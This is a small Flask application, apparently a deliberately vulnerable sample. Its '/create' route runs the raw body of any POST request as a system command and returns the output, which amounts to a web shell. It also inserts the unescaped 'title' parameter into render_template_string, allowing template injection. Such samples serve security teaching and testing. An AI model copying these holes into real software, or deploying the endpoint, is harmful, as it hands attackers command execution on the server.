from flask import Flask, request, render_template_string

app = Flask(__name__)
app.secret_key = b'SECRET_KEY'

@app.route('/create', methods=['GET','POST'])
def no_filter():
    title = request.args.get('title')
    print('title: ',title)

    if request.method == 'POST':
        import subprocess
        cmd = request.data
        if cmd:
            p = subprocess.Popen(cmd.split(),
                       	stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            p.wait()
            out, err = p.communicate()
            return out

    template = '''
        <!DOCTYPE html>
        <html>
          <head>
            <title>Create</title>
          </head>
          <body>
            <p>''' + title + '''</p>
          </body>
        </html>'''
    return render_template_string(template)

if __name__ == '__main__':
        app.run()
